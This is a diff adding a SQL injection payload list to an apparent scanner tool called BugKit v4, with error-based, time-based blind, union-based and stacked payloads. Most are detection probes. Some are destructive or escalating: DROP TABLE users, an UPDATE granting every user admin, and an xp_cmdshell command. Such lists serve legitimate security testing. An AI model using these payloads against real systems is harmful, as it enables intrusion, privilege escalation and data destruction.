@@ -1,0 +1,43 @@
+# BugKit v4 — SQL Injection Payload List
+# Format: bare payloads (applied to all sqli checks)
+# Lines starting with # are comments
+
+# Error-based
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+' OR '1'='1'--
+1' AND SLEEP(0)--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+admin'--
+1 OR 1=1
+' OR 1=1#
+') OR ('1'='1
+' OR ''='
+'; DROP TABLE users--
+1; SELECT 1--
+
+# Time-based blind
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND pg_sleep(5)--
+1 AND SLEEP(5)
+' OR SLEEP(5)--
+1; SELECT SLEEP(5)--
+' AND 1=BENCHMARK(5000000,MD5(1))--
+
+# Union-based discovery
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' UNION SELECT @@version--
+' UNION SELECT user()--
+' UNION SELECT database()--
+' UNION ALL SELECT NULL--
+
+# Second-order / stacked
+'; INSERT INTO logs VALUES('injected')--
+'; UPDATE users SET role='admin' WHERE '1'='1
+'; EXEC xp_cmdshell('whoami')--
